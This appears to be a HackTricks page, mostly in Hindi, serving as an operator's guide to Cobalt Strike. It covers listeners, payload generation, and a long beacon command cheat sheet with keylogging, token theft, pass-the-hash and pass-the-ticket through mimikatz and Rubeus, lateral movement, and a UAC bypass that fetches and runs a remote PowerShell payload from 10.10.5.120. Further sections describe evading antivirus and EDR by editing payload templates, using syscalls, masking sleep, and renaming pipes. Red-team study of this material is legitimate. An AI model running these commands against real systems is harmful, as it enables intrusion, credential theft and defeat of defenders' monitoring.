# Cobalt Strike

{{#include ../banners/hacktricks-training.md}}

### Listeners

### C2 Listeners

`Cobalt Strike -> Listeners -> Add/Edit` फिर आप चुन सकते हैं कि कहाँ listen करना है, किस प्रकार के beacon का उपयोग करना है (http, dns, smb...) और अन्य विकल्प।

### Peer2Peer Listeners

इन Listeners के beacons को सीधे C2 से communicate करने की आवश्यकता नहीं होती; वे अन्य beacons के माध्यम से इससे communicate कर सकते हैं।

`Cobalt Strike -> Listeners -> Add/Edit` फिर आपको TCP या SMB beacons चुनने होंगे।

* **TCP beacon चुने गए port पर listener सेट करेगा**। TCP beacon से connect करने के लिए किसी अन्य beacon से `connect <ip> <port>` command का उपयोग करें।
* **smb beacon चुने गए नाम वाले pipename पर listen करेगा**। SMB beacon से connect करने के लिए `link [target] [pipe]` command का उपयोग करें।

### Generate और Host payloads

#### Files में payloads Generate करें

`Attacks -> Packages ->`

* HTA files के लिए **`HTMLApplication`**
* macro वाले office document के लिए **`MS Office Macro`**
* .exe, .dll या service .exe के लिए **`Windows Executable`**
* **stageless** .exe, .dll या service .exe के लिए **`Windows Executable (S)`** (staged की तुलना में stageless बेहतर है, क्योंकि कम IoCs होते हैं)

#### Generate और Host payloads

`Attacks -> Web Drive-by -> Scripted Web Delivery (S)` यह cobalt strike से beacon download करने के लिए bitsadmin, exe, powershell और python जैसे formats में एक script/executable generate करेगा।

#### Host Payloads

यदि आपके पास पहले से वह file है जिसे आप किसी web sever पर host करना चाहते हैं, तो `Attacks -> Web Drive-by -> Host File` पर जाएँ और host करने के लिए file तथा web server config चुनें।

### Beacon Options

<details>
<summary>Beacon options और commands</summary>
```bash
# Execute local .NET binary
execute-assembly </path/to/executable.exe>
# Note that to load assemblies larger than 1MB, the 'tasks_max_size' property of the malleable profile needs to be modified.

# Screenshots
printscreen    # Take a single screenshot via PrintScr method
screenshot     # Take a single screenshot
screenwatch    # Take periodic screenshots of desktop
## Go to View -> Screenshots to see them

# keylogger
keylogger [pid] [x86|x64]
## View > Keystrokes to see the keys pressed

# portscan
portscan [pid] [arch] [targets] [ports] [arp|icmp|none] [max connections] # Inject portscan action inside another process
portscan [targets] [ports] [arp|icmp|none] [max connections]

# Powershell
## Import Powershell module
powershell-import C:\path\to\PowerView.ps1
powershell-import /root/Tools/PowerSploit/Privesc/PowerUp.ps1
powershell <just write powershell cmd here> # Uses the highest supported PowerShell version (not OPSEC-friendly)
powerpick <cmdlet> <args> # This creates a sacrificial process specified by spawnto, and injects UnmanagedPowerShell into it for better opsec (not logging)
powerpick Invoke-PrivescAudit | fl
psinject <pid> <arch> <commandlet> <arguments> # This injects UnmanagedPowerShell into the specified process to run the PowerShell cmdlet.


# User impersonation
## Token generation with creds
make_token [DOMAIN\user] [password] #Create token to impersonate a user in the network
ls \\computer_name\c$ # Try to use generated token to access C$ in a computer
rev2self # Stop using token generated with make_token
## The use of make_token generates event 4624: An account was successfully logged on.  This event is very common in a Windows domain, but can be narrowed down by filtering on the Logon Type.  As mentioned above, it uses LOGON32_LOGON_NEW_CREDENTIALS which is type 9.

# UAC Bypass
elevate svc-exe <listener>
elevate uac-token-duplication <listener>
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"

## Steal token from pid
## Like make_token but stealing the token from a process
steal_token [pid] # Also, this is useful for network actions, not local actions
## From the API documentation we know that this logon type "allows the caller to clone its current token". This is why the Beacon output says Impersonated <current_username> - it's impersonating our own cloned token.
ls \\computer_name\c$ # Try to use generated token to access C$ in a computer
rev2self # Stop using token from steal_token

## Launch process with nwe credentials
spawnas [domain\username] [password] [listener] #Do it from a directory with read access like: cd C:\
## Like make_token, this will generate Windows event 4624: An account was successfully logged on but with a logon type of 2 (LOGON32_LOGON_INTERACTIVE).  It will detail the calling user (TargetUserName) and the impersonated user (TargetOutboundUserName).

## Inject into process
inject [pid] [x64|x86] [listener]
## From an OpSec point of view: Don't perform cross-platform injection unless you really have to (e.g. x86 -> x64 or x64 -> x86).

## Pass the hash
## This modification process requires patching of LSASS memory which is a high-risk action, requires local admin privileges and not all that viable if Protected Process Light (PPL) is enabled.
pth [pid] [arch] [DOMAIN\user] [NTLM hash]
pth [DOMAIN\user] [NTLM hash]

## Pass the hash through mimikatz
mimikatz sekurlsa::pth /user:<username> /domain:<DOMAIN> /ntlm:<NTLM HASH> /run:"powershell -w hidden"
## Without /run, Mimikatz spawns cmd.exe; an interactive desktop user may see the shell (SYSTEM sessions are not normally visible)
steal_token <pid> #Steal token from process created by mimikatz

## Pass the ticket
## Request a ticket
execute-assembly /root/Tools/SharpCollection/Seatbelt.exe -group=system
execute-assembly C:\path\Rubeus.exe asktgt /user:<username> /domain:<domain> /aes256:<aes_keys> /nowrap /opsec
## Create a new logon session to use with the new ticket (to not overwrite the compromised one)
make_token <domain>\<username> DummyPass
## Write the ticket on the attacker machine from a PowerShell session and load it
[System.IO.File]::WriteAllBytes("C:\Users\Administrator\Desktop\jkingTGT.kirbi", [System.Convert]::FromBase64String("[...ticket...]"))
kerberos_ticket_use C:\Users\Administrator\Desktop\jkingTGT.kirbi

## Pass the ticket from SYSTEM
## Generate a new process with the ticket
execute-assembly C:\path\Rubeus.exe asktgt /user:<USERNAME> /domain:<DOMAIN> /aes256:<AES KEY> /nowrap /opsec /createnetonly:C:\Windows\System32\cmd.exe
## Steal the token from that process
steal_token <pid>

## Extract ticket + Pass the ticket
### List tickets
execute-assembly C:\path\Rubeus.exe triage
### Dump an interesting ticket by LUID
execute-assembly C:\path\Rubeus.exe dump /service:krbtgt /luid:<luid> /nowrap
### Create new logon session, note luid and processid
execute-assembly C:\path\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe
### Insert ticket in generate logon session
execute-assembly C:\path\Rubeus.exe ptt /luid:0x92a8c /ticket:[...base64-ticket...]
### Finally, steal the token from that new process
steal_token <pid>

# Lateral Movement
## If a token was created it will be used
jump [method] [target] [listener]
## Methods:
## psexec                    x86   Use a service to run a Service EXE artifact
## psexec64                  x64   Use a service to run a Service EXE artifact
## psexec_psh                x86   Use a service to run a PowerShell one-liner
## winrm                     x86   Run a PowerShell script via WinRM
## winrm64                   x64   Run a PowerShell script via WinRM
## wmi_msbuild               x64   WMI lateral movement with an MSBuild inline C# task (OPSEC)


remote-exec [method] [target] [command] # remote-exec doesn't return output
## Methods:
## psexec                          Remote execute via Service Control Manager
## winrm                           Remote execute via WinRM (PowerShell)
## wmi                             Remote execute via WMI

## To execute a beacon with wmi (it isn't in the jump command) just upload the beacon and execute it
beacon> upload C:\Payloads\beacon-smb.exe
beacon> remote-exec wmi srv-1 C:\Windows\beacon-smb.exe


# Pass session to Metasploit - Through listener
## On the Metasploit host
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_http
msf6 exploit(multi/handler) > set LHOST eth0
msf6 exploit(multi/handler) > set LPORT 8080
msf6 exploit(multi/handler) > exploit -j

## On cobalt: Listeners > Add and set the Payload to Foreign HTTP. Set the Host to 10.10.5.120, the Port to 8080 and click Save.
beacon> spawn metasploit
## You can only spawn x86 Meterpreter sessions with the foreign listener.

# Pass session to Metasploit - Through shellcode injection
## On metasploit host
msfvenom -p windows/x64/meterpreter_reverse_http LHOST=<IP> LPORT=<PORT> -f raw -o /tmp/msf.bin
## Run msfvenom and prepare the multi/handler listener

## Copy bin file to cobalt strike host
ps
shinject <pid> x64 C:\Payloads\msf.bin #Inject metasploit shellcode in a x64 process

# Pass metasploit session to cobalt strike
## Generate stageless Beacon shellcode: go to Attacks > Packages > Windows Executable (S), select the listener, choose Raw output, and enable the x64 payload.
## Use post/windows/manage/shellcode_inject in metasploit to inject the generated cobalt srike shellcode


# Pivoting
## Open a socks proxy in the teamserver
beacon> socks 1080

# SSH connection
beacon> ssh 10.10.17.12:22 username password
```
</details>

### Custom implants / Linux Beacons

- एक custom agent को केवल Cobalt Strike Team Server HTTP/S protocol (default malleable C2 profile) में बात करने की आवश्यकता होती है, ताकि वह register/check-in कर सके और tasks प्राप्त कर सके। Cobalt Strike UI को tasking और output के लिए reuse करने हेतु profile में परिभाषित समान URIs/headers/metadata crypto को implement करें।<sup>[[1]](#references)[[4]](#references)[[5]](#references)[[6]](#references)[[7]](#references)</sup>
- एक Aggressor Script (जैसे, `CustomBeacon.cna`) non-Windows beacon के लिए payload generation को wrap कर सकता है, ताकि operators listener चुन सकें और GUI से सीधे ELF payloads बना सकें।
- Team Server के सामने expose किए गए Linux task handlers के उदाहरण: `sleep`, `cd`, `pwd`, `shell` (arbitrary commands execute करना), `ls`, `upload`, `download`, और `exit`। ये Team Server द्वारा अपेक्षित task IDs से map होते हैं और proper format में output लौटाने के लिए server-side implement किए जाने चाहिए।
- Linux पर BOF support, [TrustedSec's ELFLoader](https://github.com/trustedsec/ELFLoader) के साथ Beacon Object Files को in-process load करके जोड़ा जा सकता है (यह Outflank-style BOFs को भी support करता है)। इससे modular post-exploitation को नए processes spawn किए बिना implant के context/privileges में चलाया जा सकता है।<sup>[[2]](#references)[[3]](#references)</sup>
- Windows Beacons के साथ pivoting parity बनाए रखने के लिए custom beacon में SOCKS handler embed करें: जब operator `socks <port>` चलाए, तो implant को एक local proxy खोलना चाहिए, जिससे operator tooling compromised Linux host के माध्यम से internal networks तक route हो सके।

## Opsec

### Execute-Assembly

**`execute-assembly`** indicated program को execute करने के लिए remote process injection का उपयोग करके एक **sacrificial process** इस्तेमाल करता है। यह बहुत noisy है, क्योंकि किसी process में inject करने के लिए कुछ Win APIs का उपयोग किया जाता है, जिन्हें हर EDR check करता है। हालांकि, कुछ custom tools हैं जिनका उपयोग उसी process में कुछ load करने के लिए किया जा सकता है:

- [https://github.com/anthemtotheego/InlineExecute-Assembly](https://github.com/anthemtotheego/InlineExecute-Assembly)
- [https://github.com/kyleavery/inject-assembly](https://github.com/kyleavery/inject-assembly)
- Cobalt Strike में आप BOF (Beacon Object Files) का भी उपयोग कर सकते हैं: [https://github.com/CCob/BOF.NET](https://github.com/CCob/BOF.NET)

Aggressor script `https://github.com/outflanknl/HelpColor` Cobalt Strike में `helpx` command बनाएगी, जो commands में colors लगाएगी और बताएगी कि वे BOFs (green), Frok&Run (yellow) और similar हैं, या ProcessExecution, injection अथवा similar (red) हैं। इससे यह जानने में सहायता मिलती है कि कौन-से commands अधिक stealthy हैं।

### Modern in-process post-execution

Recent versions classic COFF BOF के अत्यधिक constrained होने पर दो alternatives जोड़ते हैं:

- **Beacon Interpreter** Team Server पर C को intermediate bytecode में compile करता है और उसे Beacon में embedded VM में execute करता है। Bytecode native executable code के बजाय data के रूप में रहता है, इसलिए इससे BOF load करने के लिए सामान्यतः आवश्यक extra executable allocation और RW-to-RX permission transition से बचा जा सकता है। Scripts Beacon API import कर सकती हैं और BOF-style Dynamic Function Resolution (DFR) prototypes declare कर सकती हैं।
- **BOF-PE** current Beacon में एक complete EXE या DLL load करता है। यह format normal PE imports, exception handling, richer C++ और external libraries को support करता है तथा Beacon API को बनाए रखता है। यह छोटे COFF BOF से heavier है, इसलिए इसे तभी चुनें जब additional runtime उपयोगी हो।
```bash
# Compile a C script on the Team Server and execute its bytecode
beacon-interpreter /path/to/script.c

# Execute a BOF-PE in the current Beacon
inline-execute-pe /path/to/tool.x64.exe
```
ये mechanisms loader-related signals को कम करते हैं, script की actions या Windows API calls से उत्पन्न telemetry को नहीं।<sup>[[8]](#references)</sup>

### User के रूप में कार्य करें

आप `Seatbelt.exe LogonEvents ExplicitLogonEvents PoweredOnEvents` जैसी events की जाँच कर सकते हैं:

- Security EID 4624 - सामान्य working hours जानने के लिए सभी interactive logons की जाँच करें।
- System EID 12,13 - shutdown/startup/sleep की frequency की जाँच करें।
- Security EID 4624/4625 - inbound valid/invalid NTLM attempts की जाँच करें।
- Security EID 4648 - यह event तब बनता है जब plaintext credentials का उपयोग करके logon किया जाता है। यदि इसे किसी process ने generate किया है, तो binary में credentials किसी config file में clear text के रूप में या code के अंदर हो सकते हैं।

Cobalt Strike से `jump` का उपयोग करते समय, नए process को अधिक legitimate दिखाने के लिए `wmi_msbuild` method का उपयोग करना बेहतर है।

### Computer accounts का उपयोग करें

Defenders द्वारा users से उत्पन्न होने वाले असामान्य behaviours की जाँच करना सामान्य है और वे अक्सर service accounts तथा `*$` जैसे computer accounts को अपनी monitoring से **exclude कर देते हैं**। आप इन accounts का उपयोग lateral movement या privilege escalation करने के लिए कर सकते हैं।

### Stageless payloads का उपयोग करें

Stageless payloads, staged payloads की तुलना में कम noisy होते हैं क्योंकि उन्हें C2 server से second stage download करने की आवश्यकता नहीं होती। इसका अर्थ है कि initial connection के बाद वे कोई network traffic generate नहीं करते, जिससे network-based defenses द्वारा उनके detect होने की संभावना कम हो जाती है।

### Tokens & Token Store

Tokens को steal या generate करते समय सावधान रहें क्योंकि EDR thread tokens को enumerate कर सकता है और process के अंदर **किसी अलग user या SYSTEM से संबंधित token** का पता लगा सकता है।

इससे tokens को **प्रत्येक beacon के लिए store** करना संभव होता है, इसलिए एक ही token को बार-बार steal करने की आवश्यकता नहीं होती। यह lateral movement के लिए या तब उपयोगी है जब आपको किसी stolen token का कई बार उपयोग करना हो:

- `token-store steal <pid>`
- `token-store steal-and-use <pid>`
- token-store show
- `token-store use <id>`
- `token-store remove <id>`
- token-store remove-all

Lateral movement करते समय, आमतौर पर **नया token generate करने** या pass the hash attack करने की तुलना में **किसी token को steal करना बेहतर होता है**।

### Guardrails

Cobalt Strike में **Guardrails** नामक एक feature है, जो ऐसे commands या actions के उपयोग को रोकने में मदद करता है जिन्हें defenders detect कर सकते हैं। Guardrails को specific commands, जैसे `make_token`, `jump`, `remote-exec` और lateral movement या privilege escalation के लिए आमतौर पर उपयोग किए जाने वाले अन्य commands को block करने के लिए configure किया जा सकता है।

इसके अलावा, repo [https://github.com/Arvanaghi/CheckPlease/wiki/System-Related-Checks](https://github.com/Arvanaghi/CheckPlease/wiki/System-Related-Checks) में भी कुछ checks और ideas हैं, जिन्हें payload execute करने से पहले consider किया जा सकता है।

### Tickets encryption

AD में tickets की encryption के बारे में सावधान रहें। Default रूप से, कुछ tools Kerberos tickets के लिए RC4 encryption का उपयोग करेंगे, जो AES encryption से कम secure है, जबकि up-to-date environments default रूप से AES का उपयोग करेंगे। Weak encryption algorithms के लिए monitoring कर रहे defenders इसका पता लगा सकते हैं।

### Defaults से बचें

Cobalt Strike का उपयोग करते समय, default रूप से SMB pipes का नाम `msagent_####` और `"status_####"` होगा। इन names को बदलें। Cobal Strike से existing pipes के names को इस command से check करना संभव है: `ls \\.\pipe\`

इसके अलावा, SSH sessions के साथ `\\.\pipe\postex_ssh_####` नामक एक pipe create होता है। इसे `set ssh_pipename "<new_name>";` से बदलें।

Post-exploitation attack में `\\.\pipe\postex_####` pipes को `set pipename "<new_name>"` से modify किया जा सकता है।

Cobalt Strike profiles में आप निम्न चीज़ों को भी modify कर सकते हैं:

- `rwx` का उपयोग करने से बचना
- Process injection का behavior कैसे काम करता है (कौन-से APIs उपयोग किए जाएंगे), `process-inject {...}` block में
- `post-ex {…}` block में "fork and run" कैसे काम करता है
- Sleep time
- Memory में load की जाने वाली binaries का max size
- `stage {...}` block के साथ memory footprint और DLL content
- Network traffic

### Sleepmask और BeaconGate

Sleepmask, Beacon और उसकी tracked heap allocations को dormant रहने के दौरान transform करता है, फिर task execution के लिए उन्हें restore करता है। Current releases एक evasive default प्रदान करते हैं, लेकिन जब memory layout, allocation या call-stack requirements अलग हों, तब custom Sleepmask BOFs उपयोगी रहते हैं। 4.13 से default Sleepmask BeaconGate के माध्यम से proxied APIs के return address को भी spoof करता है।<sup>[[8]](#references)</sup>

**BeaconGate**, इस design को `Sleep` से आगे बढ़ाता है: selected WinAPI calls को `FUNCTION_CALL` structures के रूप में represent किया जाता है और Sleepmask BOF को forward किया जाता है, जो call execute करते समय Beacon को mask कर सकता है। Profile किसी group (`Comms`, `Core`, `Cleanup` या `All`) को gate कर सकता है या केवल individual APIs को:<sup>[[9]](#references)</sup>
```text
stage {
set sleep_mask "true";
set syscall_method "Indirect";

beacon_gate {
VirtualAlloc;       # Routed through BeaconGate
VirtualAllocEx;
InternetConnectA;
}
}
```
`beacon_gate` के अंतर्गत सूचीबद्ध API के लिए, gate को `syscall_method` पर प्राथमिकता मिलती है; सूचीबद्ध न किए गए API अब भी configured syscall method का उपयोग कर सकते हैं। `beacon_gate disable` और `beacon_gate enable` runtime पर इस feature को toggle करते हैं। `All` को बिना सोचे-समझे enable करने से बचें: `ps` जैसे commands बार-बार `OpenProcess`/`CloseHandle` को call करते हैं और हर call में Beacon को mask तथा unmask करने पर CPU spike उत्पन्न कर सकते हैं। Sleepmask-VS custom gates को live implant के माध्यम से बार-बार test किए बिना debug करने के लिए mocked Beacon/Sleepmask state प्रदान करता है।<sup>[[9]](#references)</sup>

### Noisy proc injections

किसी process में code inject करना आमतौर पर बहुत noisy होता है, क्योंकि **कोई भी सामान्य process आमतौर पर यह action नहीं करता और ऐसा करने के तरीके बहुत सीमित हैं**। इसलिए, इसे behaviour-based detection systems द्वारा detect किया जा सकता है। इसके अलावा, इसे EDRs द्वारा network को scan करके भी detect किया जा सकता है, ताकि **ऐसे threads का पता लगाया जा सके जिनमें disk पर मौजूद न होने वाला code हो** (हालांकि JIT का उपयोग करने वाले browsers जैसे processes में यह आम है)। उदाहरण: [https://gist.github.com/jaredcatkinson/23905d34537ce4b5b1818c3e6405c1d2](https://gist.github.com/jaredcatkinson/23905d34537ce4b5b1818c3e6405c1d2)

### Spawnas | PID और PPID relationships

नया process spawn करते समय detection से बचने के लिए processes के बीच **एक सामान्य parent-child** relationship बनाए रखना महत्वपूर्ण है। यदि svchost.exec, iexplorer.exe को execute कर रहा है, तो यह suspicious लगेगा, क्योंकि सामान्य Windows environment में svchost.exe, iexplorer.exe का parent नहीं होता।

Cobalt Strike में नया beacon spawn करते समय, default रूप से नए listener को चलाने के लिए **`rundll32.exe`** का उपयोग करने वाला process बनाया जाता है। यह बहुत stealthy नहीं है और EDRs द्वारा आसानी से detect किया जा सकता है। इसके अलावा, `rundll32.exe` को बिना किसी args के run किया जाता है, जिससे यह और भी अधिक suspicious हो जाता है।

निम्नलिखित Cobalt Strike command के साथ, आप नए beacon को spawn करने के लिए एक अलग process निर्दिष्ट कर सकते हैं, जिससे उसका detect होना कम संभावित हो जाता है:
```bash
spawnto x86 svchost.exe
```
आप किसी profile में **`spawnto_x86` और `spawnto_x64`** setting भी बदल सकते हैं।

### Attacker traffic को proxy करना

Attackers को कभी-कभी tools को locally चलाने में सक्षम होना पड़ता है, यहाँ तक कि Linux machines पर भी, और victims के traffic को उस tool तक पहुँचाना पड़ता है (जैसे NTLM relay)।

इसके अलावा, कभी-कभी pass-the.hash या pass-the-ticket attack करने के लिए attacker के लिए इस hash या ticket को locally अपने LSASS process में **add करना** और फिर उससे pivot करना अधिक stealthy होता है, बजाय इसके कि victim machine के LSASS process को modify किया जाए।

हालाँकि, आपको **generated traffic के साथ सावधान** रहना होगा, क्योंकि हो सकता है कि आप अपने backdoor process से uncommon traffic (kerberos?) भेज रहे हों। इसके लिए आप browser process पर pivot कर सकते हैं (हालाँकि खुद को किसी process में inject करते हुए आप पकड़े जा सकते हैं, इसलिए इसे करने का कोई stealth तरीका सोचें)।

### AVs से बचना

#### AV/AMSI/ETW Bypass

यह page देखें:


{{#ref}}
av-bypass.md
{{#endref}}


#### Artifact Kit

आमतौर पर `/opt/cobaltstrike/artifact-kit` में आपको payloads का code और pre-compiled templates (in `/src-common`) मिल सकते हैं, जिनका उपयोग Cobalt Strike binary beacons generate करने के लिए करता है।

Generated backdoor (या केवल compiled template) के साथ [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck) का उपयोग करके आप पता लगा सकते हैं कि Defender को trigger करने वाली चीज़ क्या है। यह आमतौर पर कोई string होती है। इसलिए आप केवल उस code को modify कर सकते हैं जो backdoor generate कर रहा है, ताकि वह string final binary में दिखाई न दे।

Code modify करने के बाद उसी directory से `./build.sh` चलाएँ और `dist-pipe/` folder को Windows client में `C:\Tools\cobaltstrike\ArtifactKit` पर copy करें।
```
pscp -r root@kali:/opt/cobaltstrike/artifact-kit/dist-pipe .
```
आक्रामक script `dist-pipe\artifact.cna` लोड करना न भूलें, ताकि Cobalt Strike डिस्क से वे resources उपयोग करे जिन्हें हम चाहते हैं, न कि पहले से लोड किए गए resources।

#### Resource Kit

ResourceKit फ़ोल्डर में Cobalt Strike के script-आधारित payloads के templates होते हैं, जिनमें PowerShell, VBA और HTA शामिल हैं।

[ThreatCheck](https://github.com/rasta-mouse/ThreatCheck) को templates के साथ उपयोग करके आप पता लगा सकते हैं कि defender को (इस मामले में AMSI) क्या पसंद नहीं आ रहा है और उसमें बदलाव कर सकते हैं:
```
.\ThreatCheck.exe -e AMSI -f .\cobaltstrike\ResourceKit\template.x64.ps1
```
Detected lines में बदलाव करके ऐसा template बनाया जा सकता है जिसे पकड़ा नहीं जाएगा।

Aggressive script `ResourceKit\resources.cna` को load करना न भूलें, ताकि Cobalt Strike को यह बताया जा सके कि वह disk से हमारे इच्छित resources का उपयोग करे, न कि पहले से loaded resources का।

#### Function hooks | Syscall

Function hooking malicious activity का पता लगाने के लिए ERDs का एक बहुत common method है। Cobalt Strike standard Windows API calls के बजाय **syscalls** का उपयोग करके इन hooks को bypass करने की अनुमति देता है। इसके लिए **`None`** config का उपयोग किया जा सकता है, या **`Direct`** setting के साथ किसी function के `Nt*` version का उपयोग किया जा सकता है, अथवा malleable profile में **`Indirect`** option के माध्यम से सीधे `Nt*` function के ऊपर jump किया जा सकता है। System के आधार पर कोई एक option दूसरे से अधिक stealthy हो सकता है।

इसे profile में या **`syscall-method`** command का उपयोग करके set किया जा सकता है।

हालाँकि, यह noisy भी हो सकता है।

Function hooks को bypass करने के लिए Cobalt Strike द्वारा दिया गया एक option इन hooks को [**unhook-bof**](https://github.com/Cobalt-Strike/unhook-bof) से remove करना है।

आप [**https://github.com/Mr-Un1k0d3r/EDRs**](https://github.com/Mr-Un1k0d3r/EDRs) या [**https://github.com/matterpreter/OffensiveCSharp/tree/master/HookDetector**](https://github.com/matterpreter/OffensiveCSharp/tree/master/HookDetector) से यह भी check कर सकते हैं कि कौन-से functions hooked हैं।




<details>
<summary>विविध Cobalt Strike commands</summary>
```bash
cd C:\Tools\neo4j\bin
neo4j.bat console
http://localhost:7474/ --> Change password
execute-assembly C:\Tools\SharpHound3\SharpHound3\bin\Debug\SharpHound.exe -c All -d DOMAIN.LOCAL



# Change powershell
C:\Tools\cobaltstrike\ResourceKit
template.x64.ps1
# Change $var_code -> $polop
# $x --> $ar
cobalt strike --> script manager --> Load --> Cargar C:\Tools\cobaltstrike\ResourceKit\resources.cna

#artifact kit
cd  C:\Tools\cobaltstrike\ArtifactKit
pscp -r root@kali:/opt/cobaltstrike/artifact-kit/dist-pipe .


```
</details>



## References

- [1] [Cobalt Strike Linux Beacon (custom implant PoC)](https://github.com/EricEsquivel/CobaltStrike-Linux-Beacon)
- [2] [TrustedSec ELFLoader और Linux BOFs](https://github.com/trustedsec/ELFLoader)
- [3] [Outflank nix BOF template](https://github.com/outflanknl/nix_bof_template)
- [4] [Cobalt Strike metadata encryption का Unit42 analysis](https://unit42.paloaltonetworks.com/cobalt-strike-metadata-encryption-decryption/)
- [5] [Cobalt Strike traffic पर SANS ISC diary](https://isc.sans.edu/diary/27968)
- [6] [cs-decrypt-metadata-py](https://blog.didierstevens.com/2021/10/22/new-tool-cs-decrypt-metadata-py/)
- [7] [SentinelOne CobaltStrikeParser](https://github.com/Sentinel-One/CobaltStrikeParser)
- [8] [Cobalt Strike 4.13: Translation में खोया हुआ](https://www.cobaltstrike.com/blog/cobalt-strike-413-lost-in-translation)
- [9] [Cobalt Strike 4.10: BeaconGate के माध्यम से](https://www.cobaltstrike.com/blog/cobalt-strike-410-through-the-beacongate?p=6046)
{{#include ../banners/hacktricks-training.md}}
